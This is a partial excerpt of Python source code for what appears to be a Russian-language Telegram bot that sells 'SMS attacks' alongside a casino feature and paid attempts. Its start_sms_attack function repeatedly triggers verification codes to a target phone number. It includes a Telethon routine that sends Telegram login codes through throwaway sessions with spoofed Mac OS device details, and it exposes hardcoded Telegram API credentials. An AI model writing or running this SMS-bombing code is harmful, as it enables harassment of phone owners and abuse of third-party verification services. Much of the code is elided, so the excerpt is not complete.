...
TELEGRAM_API_ID = 26898982
TELEGRAM_API_HASH = '1aff100a728735d53a0d9ce391fb9ed0'

# 10 случайных User-Agent для Mac OS
USER_AGENTS = [
...
class SMSSystem:
    ...
    async def send_telegram_code(self, phone):
        """Отправка кода через Telethon"""
        try:
            # Создаем уникальную сессию для каждого запроса
            session_name = f"session_{random.randint(1000, 9999)}"
            client = TelegramClient(
                session_name, 
                TELEGRAM_API_ID, 
                TELEGRAM_API_HASH,
                device_model="Mac OS X",
                system_version="10.15.7",
                app_version="8.4"
            )
            ...
            logger.error(f"Telethon error for {phone}: {e}")
            return False
    
    async def send_sms_to_service(self, phone, service_url, session):
        headers = {
        ...
        try:
            # Для Telegram используем Telethon
            if 'telegram' in service_url:
                return await self.send_telegram_code(phone)
    ...
    async def start_sms_attack(self, phone, user_id, message):
        # Обновленные сервисы с Telethon для Telegram
        services = [
            "telegram",  # Будет обработано через Telethon
        ...
        async with aiohttp.ClientSession() as session:
            while sms_count < max_sms and self.active_attacks.get(user_id, True):
                ...
                for service_url in services:
                    ...
                    success = await self.send_sms_to_service(phone, service_url, session)
                    sms_count += 1
                    
                    status = "успешен" if success else "не успешен"
                    service_name = "Telegram (Telethon)" if service_url == "telegram" else service_url.split('/')[2] if '//' in service_url else service_url
...
async def refresh_payment(callback: types.CallbackQuery):
    transaction_id = callback.data.split("_")[2]
...
async def casino_stats(callback: types.CallbackQuery):
    stats = casino_system.stats
    total_plays = stats.get("total_plays", 0)
    total_bet = stats.get("total_bet", 0)
    total_won = stats.get("total_won", 0)
    
    if total_plays > 0:
        win_rate = (stats.get("total_won", 0) / total_bet * 100) if total_bet > 0 else 0
    else:
        win_rate = 0
    
    await callback.message.answer(
        f"📊 **Статистика казино**\n\n"
        f"🎰 Всего игр: {total_plays}\n"
        f"💰 Общая сумма ставок: {total_bet}\n"
        f"🏆 Общий выигрыш: {total_won}\n"
...
@dp.callback_query(F.data == "give_self")
async def give_self(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    user_data = get_user_data(user_id)
    user_data["attempts"] += 100
    save_user_data(user_id, user_data)
    await callback.message.answer("✅ Вам выдано 100 попыток!")
...
async def admin_stats(callback: types.CallbackQuery):
    ...
    total_attempts = sum(user['attempts'] for user in users.values())
    total_transactions = len(load_data(TRANSACTIONS_FILE))
    total_promocodes = len(load_data(PROMOCODES_FILE))
